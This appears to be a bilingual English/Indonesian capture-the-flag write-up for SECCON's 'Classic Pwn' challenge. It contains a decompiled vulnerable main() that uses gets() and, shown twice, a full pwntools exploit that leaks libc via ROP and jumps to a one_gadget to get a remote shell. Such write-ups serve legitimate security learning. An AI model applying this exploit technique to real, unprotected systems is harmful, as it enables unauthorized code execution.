# Classic Pwn
---
**Points:** 121 | **Solves:** 197/653 | **Category:** Pwn

Host: classic.pwn.seccon.jp
Port: 17354

[Download](classic_aa9e979fd5c597526ef30c003bffee474b314e22)
[Download](libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253)

---

[Bahasa Indonesia](#bahasa-indonesia)

## English
A classic binary exploitation challenge. 
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Below is the main function.
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-40h]

  puts("Classic Pwnable Challenge");
  printf("Local Buffer >> ", argv);
  gets(&v4);
  puts("Have a nice pwn!!");
  return 0;
}
```

The program calls gets without canary.
Spawn shell by ROP overwriting return-address (rbp+0x8) to leak-libc -> back-to-main.
On the second gets, call one_gadget.
```
1st gets: pop rdi -> puts GOT/PLT -> function puts -> main
2nd gets: one_gadget
``` 

Below is the script.
```python
from pwn import *

one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

r = remote('classic.pwn.seccon.jp', 17354)
libc = ELF('./libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253')

r.sendline('a' * 0x48 + p64(0x00400753) + p64(0x601018) + p64(0x400520) + p64(0x4006A9))
r.recvuntil('Local Buffer >> Have a nice pwn!!\n')

libc_base = u64(r.recvline().strip() + '\x00\x00') - libc.symbols.puts
print hex(libc_base)

r.sendline('a' * 0x48 + p64(libc_base+one[0]))
r.interactive()
```

## Bahasa Indonesia
Soal klasik binary exploitation.
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Berikut main function.
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-40h]

  puts("Classic Pwnable Challenge");
  printf("Local Buffer >> ", argv);
  gets(&v4);
  puts("Have a nice pwn!!");
  return 0;
}
```

Program memanggil gets tanpa canary.
Spawn shell dengan ROP menimpa return address (rbp+0x8) dengan leak-libc -> balik-ke-main.
Pada gets kedua, panggil one_gadget.
```
1st gets: pop rdi -> puts GOT/PLT -> function puts -> main
2nd gets: one_gadget
``` 

Berikut script yang digunakan.
```python
from pwn import *

one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

r = remote('classic.pwn.seccon.jp', 17354)
libc = ELF('./libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253')

r.sendline('a' * 0x48 + p64(0x00400753) + p64(0x601018) + p64(0x400520) + p64(0x4006A9))
r.recvuntil('Local Buffer >> Have a nice pwn!!\n')

libc_base = u64(r.recvline().strip() + '\x00\x00') - libc.symbols.puts
print hex(libc_base)

r.sendline('a' * 0x48 + p64(libc_base+one[0]))
r.interactive()
```